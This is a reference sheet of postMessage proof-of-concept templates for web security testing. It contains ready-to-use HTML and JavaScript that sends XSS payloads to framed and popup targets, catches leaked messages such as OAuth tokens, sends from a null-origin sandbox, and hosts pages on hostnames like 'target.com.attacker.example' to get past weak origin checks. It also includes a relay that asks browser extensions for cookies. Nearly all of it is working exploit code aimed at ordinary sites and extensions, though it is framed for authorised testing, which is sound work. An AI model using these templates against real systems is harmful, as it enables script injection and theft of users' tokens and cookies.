# postMessage PoC Templates

Serve from `localhost` or your own domain. Use in your own browser session. Replace `TARGET_URL` and the message shape with what the handler expects (read it from the JS).

## 1. Send to a framed target (listener test)

```html
<iframe id="t" src="TARGET_URL" width="800" height="500"></iframe>
<script>
  const msg = {type: "render", html: "<img src=x onerror=alert(document.domain)>"};
  t.onload = () => t.contentWindow.postMessage(msg, "*");
</script>
```

## 2. Send to a popup (target cannot be framed)

```html
<button onclick="go()">Open</button>
<script>
function go() {
  const w = window.open("TARGET_URL", "pm");
  const msg = "<img src=x onerror=alert(document.domain)>";
  // Send repeatedly while the page loads; stop after a few seconds.
  const iv = setInterval(() => { try { w.postMessage(msg, "*"); } catch (e) {} }, 300);
  setTimeout(() => clearInterval(iv), 6000);
}
</script>
```

## 3. Catch messages the target sends (leak test)

```html
<pre id="log"></pre>
<iframe src="TARGET_URL" width="800" height="400"></iframe>
<script>
  window.addEventListener("message", e => {
    log.textContent += e.origin + "  " + JSON.stringify(e.data) + "\n";
  });
</script>
```

Variant for opener leaks (OAuth popups): open the target with `window.open("TARGET_AUTH_URL")` from this page and keep the listener.

Variant for navigating a child frame to your origin to receive a reply sent with `*`:

```html
<iframe id="t" src="https://TARGET/page-with-widget"></iframe>
<script>
  window.addEventListener("message", e => console.log("caught", e.origin, e.data));
  // After load, point the widget frame (frames[0] inside the target is cross-origin, so this works only for frames you can reach)
  setTimeout(() => { try { t.contentWindow.frames[0].location = "https://YOUR-ORIGIN/catch.html"; } catch (e) { console.log(e); } }, 3000);
</script>
```

## 4. null origin sender (sandboxed iframe)

```html
<iframe sandbox="allow-scripts allow-popups" srcdoc="
<script>
  const w = window.open('TARGET_URL');
  setTimeout(() => w.postMessage('<img src=x onerror=alert(document.domain)>', '*'), 2000);
</script>"></iframe>
```

## 5. Weak-origin bypass host

Serve template 1 or 2 from a hostname that passes the weak check, for example:

- `target.com.attacker.example` (indexOf, startsWith)
- `attackertarget.com` (endsWith without dot) — register or use a lab host
- `wwwXtarget.com` style host for unescaped regex dots

For local testing, map the name to 127.0.0.1 in your hosts file.

## 6. Listener sniffer (DevTools console on the target page)

```js
getEventListeners(window).message.forEach((l, i) => console.log(i, l.listener.toString().slice(0, 800)));
```

```js
// Log every message the page receives
window.addEventListener("message", e => console.log("[pm]", e.origin, e.data), true);
```

## 7. Browser extension relay (own install)

```html
<script>
  // Many content scripts listen on window and forward to the background page.
  window.postMessage({source: "EXTENSION_SOURCE_NAME", action: "getCookies", url: "https://TARGET"}, "*");
  window.addEventListener("message", e => console.log("reply", e.data));
</script>
```

Read the extension's content script for the expected `source`/`action` keys first.

## Evidence

The listener code, the PoC page, browser version, framing/COOP headers of the target page, and a screenshot of the alert on the target origin or the caught message containing your own token.
